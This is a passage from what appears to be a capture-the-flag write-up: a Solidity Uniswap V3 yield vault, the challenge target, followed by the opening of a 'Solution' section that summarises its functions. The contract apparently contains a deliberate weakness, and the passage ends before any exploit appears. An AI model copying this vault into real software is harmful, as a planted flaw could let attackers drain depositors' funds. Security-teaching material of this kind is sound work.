&lt;&#x2F;span&gt;&lt;span&gt;        require(totalSupply() &amp;lt;= maxTotalSupply, &amp;quot;maxTotalSupply&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _poke(int24 tickLower, int24 tickUpper) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint128 liquidity, , , , ) = _position(tickLower, tickUpper);
&lt;&#x2F;span&gt;&lt;span&gt;        if (liquidity &amp;gt; 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            pool.burn(tickLower, tickUpper, 0);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _calcSharesAndAmounts(uint256 amount0Desired, uint256 amount1Desired)
&lt;&#x2F;span&gt;&lt;span&gt;        internal
&lt;&#x2F;span&gt;&lt;span&gt;        view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 shares,
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 amount0,
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 amount1
&lt;&#x2F;span&gt;&lt;span&gt;        )
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 total0, uint256 total1) = getTotalAmounts();
&lt;&#x2F;span&gt;&lt;span&gt;        
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; If total supply &amp;gt; 0, vault can&amp;#39;t be empty
&lt;&#x2F;span&gt;&lt;span&gt;        assert(totalSupply() == 0 || total0 &amp;gt; 0 || total1 &amp;gt; 0);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (totalSupply() == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            &#x2F;&#x2F; For first deposit, just use the amounts desired
&lt;&#x2F;span&gt;&lt;span&gt;            amount0 = amount0Desired;
&lt;&#x2F;span&gt;&lt;span&gt;            amount1 = amount1Desired;
&lt;&#x2F;span&gt;&lt;span&gt;            shares = Math.max(amount0, amount1);
&lt;&#x2F;span&gt;&lt;span&gt;        } else if (total0 == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            amount1 = amount1Desired;
&lt;&#x2F;span&gt;&lt;span&gt;            shares = FullMath.mulDiv(amount1, totalSupply(), total1);
&lt;&#x2F;span&gt;&lt;span&gt;        } else if (total1 == 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            amount0 = amount0Desired;
&lt;&#x2F;span&gt;&lt;span&gt;            shares = FullMath.mulDiv(amount0, totalSupply(), total0);
&lt;&#x2F;span&gt;&lt;span&gt;        } else {
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 cross = Math.min(amount0Desired * total1, amount1Desired * total0);
&lt;&#x2F;span&gt;&lt;span&gt;            require(cross &amp;gt; 0, &amp;quot;cross&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &#x2F;&#x2F; Round up amounts
&lt;&#x2F;span&gt;&lt;span&gt;            amount0 = (cross - 1) &#x2F; total1 + 1;
&lt;&#x2F;span&gt;&lt;span&gt;            amount1 = (cross - 1) &#x2F; total0 + 1;
&lt;&#x2F;span&gt;&lt;span&gt;            shares = cross * totalSupply() &#x2F; total0 &#x2F; total1;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function withdraw(
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 shares,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount0Min,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount1Min,
&lt;&#x2F;span&gt;&lt;span&gt;        address to
&lt;&#x2F;span&gt;&lt;span&gt;    ) external nonReentrant returns (uint256 amount0, uint256 amount1) {
&lt;&#x2F;span&gt;&lt;span&gt;        require(shares &amp;gt; 0, &amp;quot;shares&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(to != address(0) &amp;amp;&amp;amp; to != address(this), &amp;quot;to&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Burn shares
&lt;&#x2F;span&gt;&lt;span&gt;        _burn(msg.sender, shares);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Calculate token amounts proportional to unused balances
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 unusedAmount0 = FullMath.mulDiv(getBalance0(), shares, totalSupply());
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 unusedAmount1 = FullMath.mulDiv(getBalance1(), shares, totalSupply());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Withdraw proportion of liquidity from Uniswap pool
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 baseAmount0, uint256 baseAmount1) =
&lt;&#x2F;span&gt;&lt;span&gt;            _burnLiquidityShare(baseLower, baseUpper, shares, totalSupply());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Sum up total amounts owed to recipient
&lt;&#x2F;span&gt;&lt;span&gt;        amount0 = unusedAmount0 + baseAmount0;
&lt;&#x2F;span&gt;&lt;span&gt;        amount1 = unusedAmount1 + baseAmount1;
&lt;&#x2F;span&gt;&lt;span&gt;        require(amount0 &amp;gt;= amount0Min, &amp;quot;amount0Min&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        require(amount1 &amp;gt;= amount1Min, &amp;quot;amount1Min&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Push tokens to recipient
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount0 &amp;gt; 0) token0.transfer(to, amount0);
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount1 &amp;gt; 0) token1.transfer(to, amount1);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        emit Withdraw(msg.sender, to, shares, amount0, amount1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _burnLiquidityShare(
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickLower,
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickUpper,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 shares,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 _totalSupply
&lt;&#x2F;span&gt;&lt;span&gt;    ) internal returns (uint256 amount0, uint256 amount1) {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint128 totalLiquidity, , , , ) = _position(tickLower, tickUpper);
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 liquidity = FullMath.mulDiv(uint256(totalLiquidity), shares, _totalSupply);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        if (liquidity &amp;gt; 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            (uint256 burned0, uint256 burned1, uint256 fees0, uint256 fees1) =
&lt;&#x2F;span&gt;&lt;span&gt;                _burnAndCollect(tickLower, tickUpper, _toUint128(liquidity));
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;            &#x2F;&#x2F; Add share of fees
&lt;&#x2F;span&gt;&lt;span&gt;            amount0 = burned0 + FullMath.mulDiv(fees0, shares, _totalSupply);
&lt;&#x2F;span&gt;&lt;span&gt;            amount1 = burned1 + FullMath.mulDiv(fees1, shares, _totalSupply);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function rebalance() external nonReentrant {
&lt;&#x2F;span&gt;&lt;span&gt;        (, int24 tick, , , , , ) = pool.slot0();
&lt;&#x2F;span&gt;&lt;span&gt;        int24 diff = tick &amp;gt; lastTick ? tick - lastTick : lastTick - tick;
&lt;&#x2F;span&gt;&lt;span&gt;        require(diff &amp;gt;= 5 * tickSpacing, &amp;quot;price diff&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        int24 _baseLower = (tick - int24(10) * tickSpacing) &#x2F; tickSpacing * tickSpacing &amp;gt; TickMath.MIN_TICK 
&lt;&#x2F;span&gt;&lt;span&gt;            ? (tick - int24(10) * tickSpacing) &#x2F; tickSpacing * tickSpacing : TickMath.MIN_TICK;
&lt;&#x2F;span&gt;&lt;span&gt;        int24 _baseUpper = (tick + int24(10) * tickSpacing) &#x2F; tickSpacing * tickSpacing &amp;lt; TickMath.MAX_TICK 
&lt;&#x2F;span&gt;&lt;span&gt;            ? (tick + int24(10) * tickSpacing) &#x2F; tickSpacing * tickSpacing : TickMath.MAX_TICK;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Withdraw all current liquidity from Uniswap pool
&lt;&#x2F;span&gt;&lt;span&gt;        {
&lt;&#x2F;span&gt;&lt;span&gt;            (uint128 baseLiquidity, , , , ) = _position(baseLower, baseUpper);
&lt;&#x2F;span&gt;&lt;span&gt;            _burnAndCollect(baseLower, baseUpper, baseLiquidity);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Emit snapshot to record balances and supply
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 balance0 = getBalance0();
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 balance1 = getBalance1();
&lt;&#x2F;span&gt;&lt;span&gt;        emit Snapshot(tick, balance0, balance1, totalSupply());
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Place base order on Uniswap
&lt;&#x2F;span&gt;&lt;span&gt;        uint128 liquidity = _liquidityForAmounts(_baseLower, _baseUpper, balance0, balance1);
&lt;&#x2F;span&gt;&lt;span&gt;        _mintLiquidity(_baseLower, _baseUpper, liquidity);
&lt;&#x2F;span&gt;&lt;span&gt;        lastTick = tick;
&lt;&#x2F;span&gt;&lt;span&gt;        (baseLower, baseUpper) = (_baseLower, _baseUpper);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _burnAndCollect(
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickLower,
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickUpper,
&lt;&#x2F;span&gt;&lt;span&gt;        uint128 liquidity
&lt;&#x2F;span&gt;&lt;span&gt;    )
&lt;&#x2F;span&gt;&lt;span&gt;        internal
&lt;&#x2F;span&gt;&lt;span&gt;        returns (
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 burned0,
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 burned1,
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 feesToVault0,
&lt;&#x2F;span&gt;&lt;span&gt;            uint256 feesToVault1
&lt;&#x2F;span&gt;&lt;span&gt;        )
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        if (liquidity &amp;gt; 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            (burned0, burned1) = pool.burn(tickLower, tickUpper, liquidity);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Collect all owed tokens including earned fees
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 collect0, uint256 collect1) =
&lt;&#x2F;span&gt;&lt;span&gt;            pool.collect(
&lt;&#x2F;span&gt;&lt;span&gt;                address(this),
&lt;&#x2F;span&gt;&lt;span&gt;                tickLower,
&lt;&#x2F;span&gt;&lt;span&gt;                tickUpper,
&lt;&#x2F;span&gt;&lt;span&gt;                type(uint128).max,
&lt;&#x2F;span&gt;&lt;span&gt;                type(uint128).max
&lt;&#x2F;span&gt;&lt;span&gt;            );
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        feesToVault0 = collect0 - burned0;
&lt;&#x2F;span&gt;&lt;span&gt;        feesToVault1 = collect1 - burned1;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 feesToProtocol0;
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 feesToProtocol1;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Update accrued protocol fees
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 _protocolFee = protocolFee;
&lt;&#x2F;span&gt;&lt;span&gt;        if (_protocolFee &amp;gt; 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            feesToProtocol0 = FullMath.mulDiv(feesToVault0, _protocolFee, 1e6);
&lt;&#x2F;span&gt;&lt;span&gt;            feesToProtocol1 = FullMath.mulDiv(feesToVault1, _protocolFee, 1e6);
&lt;&#x2F;span&gt;&lt;span&gt;            feesToVault0 = feesToVault0 - feesToProtocol0;
&lt;&#x2F;span&gt;&lt;span&gt;            feesToVault1 = feesToVault1 - feesToProtocol1;
&lt;&#x2F;span&gt;&lt;span&gt;            accruedProtocolFees0 = accruedProtocolFees0 + feesToProtocol0;
&lt;&#x2F;span&gt;&lt;span&gt;            accruedProtocolFees1 = accruedProtocolFees1 + feesToProtocol1;
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;        emit CollectFees(feesToVault0, feesToVault1, feesToProtocol0, feesToProtocol1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _mintLiquidity(
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickLower,
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickUpper,
&lt;&#x2F;span&gt;&lt;span&gt;        uint128 liquidity
&lt;&#x2F;span&gt;&lt;span&gt;    ) internal {
&lt;&#x2F;span&gt;&lt;span&gt;        if (liquidity &amp;gt; 0) {
&lt;&#x2F;span&gt;&lt;span&gt;            pool.mint(address(this), tickLower, tickUpper, liquidity, &amp;quot;&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        }
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getTotalAmounts() public view returns (uint256 total0, uint256 total1) {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint256 baseAmount0, uint256 baseAmount1) = getPositionAmounts(baseLower, baseUpper);
&lt;&#x2F;span&gt;&lt;span&gt;        total0 = getBalance0() + baseAmount0;
&lt;&#x2F;span&gt;&lt;span&gt;        total1 = getBalance1() + baseAmount1;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getPositionAmounts(int24 tickLower, int24 tickUpper)
&lt;&#x2F;span&gt;&lt;span&gt;        public
&lt;&#x2F;span&gt;&lt;span&gt;        view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (uint256 amount0, uint256 amount1)
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint128 liquidity, , , uint128 tokensOwed0, uint128 tokensOwed1) =
&lt;&#x2F;span&gt;&lt;span&gt;            _position(tickLower, tickUpper);
&lt;&#x2F;span&gt;&lt;span&gt;        (amount0, amount1) = _amountsForLiquidity(tickLower, tickUpper, liquidity);
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &#x2F;&#x2F; Subtract protocol fees
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 oneMinusFee = uint256(1e6) - protocolFee;
&lt;&#x2F;span&gt;&lt;span&gt;        amount0 = amount0 + (uint256(tokensOwed0) * oneMinusFee &#x2F; 1e6);
&lt;&#x2F;span&gt;&lt;span&gt;        amount1 = amount1 + (uint256(tokensOwed1) * oneMinusFee &#x2F; 1e6);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getBalance0() public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return token0.balanceOf(address(this)) - accruedProtocolFees0;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function getBalance1() public view returns (uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        return token1.balanceOf(address(this)) - accruedProtocolFees1;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _position(int24 tickLower, int24 tickUpper)
&lt;&#x2F;span&gt;&lt;span&gt;        internal
&lt;&#x2F;span&gt;&lt;span&gt;        view
&lt;&#x2F;span&gt;&lt;span&gt;        returns (
&lt;&#x2F;span&gt;&lt;span&gt;            uint128,
&lt;&#x2F;span&gt;&lt;span&gt;            uint256,
&lt;&#x2F;span&gt;&lt;span&gt;            uint256,
&lt;&#x2F;span&gt;&lt;span&gt;            uint128,
&lt;&#x2F;span&gt;&lt;span&gt;            uint128
&lt;&#x2F;span&gt;&lt;span&gt;        )
&lt;&#x2F;span&gt;&lt;span&gt;    {
&lt;&#x2F;span&gt;&lt;span&gt;        bytes32 positionKey = PositionKey.compute(address(this), tickLower, tickUpper);
&lt;&#x2F;span&gt;&lt;span&gt;        return pool.positions(positionKey);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _amountsForLiquidity(
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickLower,
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickUpper,
&lt;&#x2F;span&gt;&lt;span&gt;        uint128 liquidity
&lt;&#x2F;span&gt;&lt;span&gt;    ) internal view returns (uint256, uint256) {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();
&lt;&#x2F;span&gt;&lt;span&gt;        return
&lt;&#x2F;span&gt;&lt;span&gt;            LiquidityAmounts.getAmountsForLiquidity(
&lt;&#x2F;span&gt;&lt;span&gt;                sqrtRatioX96,
&lt;&#x2F;span&gt;&lt;span&gt;                TickMath.getSqrtRatioAtTick(tickLower),
&lt;&#x2F;span&gt;&lt;span&gt;                TickMath.getSqrtRatioAtTick(tickUpper),
&lt;&#x2F;span&gt;&lt;span&gt;                liquidity
&lt;&#x2F;span&gt;&lt;span&gt;            );
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _liquidityForAmounts(
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickLower,
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickUpper,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount0,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount1
&lt;&#x2F;span&gt;&lt;span&gt;    ) internal view returns (uint128) {
&lt;&#x2F;span&gt;&lt;span&gt;        (uint160 sqrtRatioX96, , , , , , ) = pool.slot0();
&lt;&#x2F;span&gt;&lt;span&gt;        return
&lt;&#x2F;span&gt;&lt;span&gt;            LiquidityAmounts.getLiquidityForAmounts(
&lt;&#x2F;span&gt;&lt;span&gt;                sqrtRatioX96,
&lt;&#x2F;span&gt;&lt;span&gt;                TickMath.getSqrtRatioAtTick(tickLower),
&lt;&#x2F;span&gt;&lt;span&gt;                TickMath.getSqrtRatioAtTick(tickUpper),
&lt;&#x2F;span&gt;&lt;span&gt;                amount0,
&lt;&#x2F;span&gt;&lt;span&gt;                amount1
&lt;&#x2F;span&gt;&lt;span&gt;            );
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function _toUint128(uint256 x) internal pure returns (uint128) {
&lt;&#x2F;span&gt;&lt;span&gt;        assert(x &amp;lt;= type(uint128).max);
&lt;&#x2F;span&gt;&lt;span&gt;        return uint128(x);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function uniswapV3MintCallback(
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount0,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount1,
&lt;&#x2F;span&gt;&lt;span&gt;        bytes calldata data
&lt;&#x2F;span&gt;&lt;span&gt;    ) external override {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == address(pool));
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount0 &amp;gt; 0) token0.transfer(msg.sender, amount0);
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount1 &amp;gt; 0) token1.transfer(msg.sender, amount1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function uniswapV3SwapCallback(
&lt;&#x2F;span&gt;&lt;span&gt;        int256 amount0Delta,
&lt;&#x2F;span&gt;&lt;span&gt;        int256 amount1Delta,
&lt;&#x2F;span&gt;&lt;span&gt;        bytes calldata data
&lt;&#x2F;span&gt;&lt;span&gt;    ) external override {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == address(pool));
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount0Delta &amp;gt; 0) token0.transfer(msg.sender, uint256(amount0Delta));
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount1Delta &amp;gt; 0) token1.transfer(msg.sender, uint256(amount1Delta));
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function collectProtocol(
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount0,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount1,
&lt;&#x2F;span&gt;&lt;span&gt;        address to
&lt;&#x2F;span&gt;&lt;span&gt;    ) external onlyGovernance {
&lt;&#x2F;span&gt;&lt;span&gt;        accruedProtocolFees0 = accruedProtocolFees0 - amount0;
&lt;&#x2F;span&gt;&lt;span&gt;        accruedProtocolFees1 = accruedProtocolFees1 - amount1;
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount0 &amp;gt; 0) token0.transfer(to, amount0);
&lt;&#x2F;span&gt;&lt;span&gt;        if (amount1 &amp;gt; 0) token1.transfer(to, amount1);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function sweep(
&lt;&#x2F;span&gt;&lt;span&gt;        IERC20 token,
&lt;&#x2F;span&gt;&lt;span&gt;        uint256 amount,
&lt;&#x2F;span&gt;&lt;span&gt;        address to
&lt;&#x2F;span&gt;&lt;span&gt;    ) external onlyGovernance {
&lt;&#x2F;span&gt;&lt;span&gt;        require(token != token0 &amp;amp;&amp;amp; token != token1, &amp;quot;token&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        token.transfer(to, amount);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function setProtocolFee(uint256 _protocolFee) external onlyGovernance {
&lt;&#x2F;span&gt;&lt;span&gt;        require(_protocolFee &amp;lt; 1e6, &amp;quot;protocolFee&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        protocolFee = _protocolFee;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function setMaxTotalSupply(uint256 _maxTotalSupply) external onlyGovernance {
&lt;&#x2F;span&gt;&lt;span&gt;        maxTotalSupply = _maxTotalSupply;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function emergencyBurn(
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickLower,
&lt;&#x2F;span&gt;&lt;span&gt;        int24 tickUpper,
&lt;&#x2F;span&gt;&lt;span&gt;        uint128 liquidity
&lt;&#x2F;span&gt;&lt;span&gt;    ) external onlyGovernance {
&lt;&#x2F;span&gt;&lt;span&gt;        pool.burn(tickLower, tickUpper, liquidity);
&lt;&#x2F;span&gt;&lt;span&gt;        pool.collect(address(this), tickLower, tickUpper, type(uint128).max, type(uint128).max);
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function setGovernance(address _governance) external onlyGovernance {
&lt;&#x2F;span&gt;&lt;span&gt;        pendingGovernance = _governance;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    function acceptGovernance() external {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == pendingGovernance, &amp;quot;pendingGovernance&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        governance = msg.sender;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    modifier onlyGovernance {
&lt;&#x2F;span&gt;&lt;span&gt;        require(msg.sender == governance, &amp;quot;governance&amp;quot;);
&lt;&#x2F;span&gt;&lt;span&gt;        _;
&lt;&#x2F;span&gt;&lt;span&gt;    }
&lt;&#x2F;span&gt;&lt;span&gt;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;h2 id=&quot;solution-3&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#solution-3&quot; aria-label=&quot;Anchor link for: solution-3&quot;&gt;Solution&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
&lt;p&gt;Uniswap V3 is scary for sure but to break things you don&#x27;t need to master it. This is an example challege of how you can do yeild farming in Uniswap V3.&lt;&#x2F;p&gt;
&lt;p&gt;Let&#x27;s break down the key components and observations of this Yield contract:&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Core Functionality&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Implements a yield farming vault for Uniswap V3&lt;&#x2F;li&gt;
&lt;li&gt;Manages liquidity positions in a specific price range&lt;&#x2F;li&gt;
&lt;li&gt;Allows users to deposit and withdraw tokens&lt;&#x2F;li&gt;
&lt;li&gt;Collects and distributes fees from the pool&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Key State Variables&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;baseLower&lt;&#x2F;code&gt; and &lt;code&gt;baseUpper&lt;&#x2F;code&gt;: Defines the price range for liquidity provision&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;lastTick&lt;&#x2F;code&gt;: Tracks the last price tick for rebalancing&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;protocolFee&lt;&#x2F;code&gt;: Fee charged by the protocol (in basis points)&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;maxTotalSupply&lt;&#x2F;code&gt;: Maximum allowed LP tokens&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;accruedProtocolFees&lt;&#x2F;code&gt;: Tracks fees collected by the protocol&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Important Functions&lt;&#x2F;strong&gt;:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;deposit()&lt;&#x2F;code&gt;: Allows users to add liquidity and receive LP tokens&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;withdraw()&lt;&#x2F;code&gt;: Lets users withdraw their share of liquidity&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;rebalance()&lt;&#x2F;code&gt;: Adjusts the liquidity position based on price changes&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;_poke()&lt;&#x2F;code&gt;: Updates the vault&#x27;s holdings&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;_calcSharesAndAmounts()&lt;&#x2F;code&gt;: Calculates LP tokens based on deposits&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
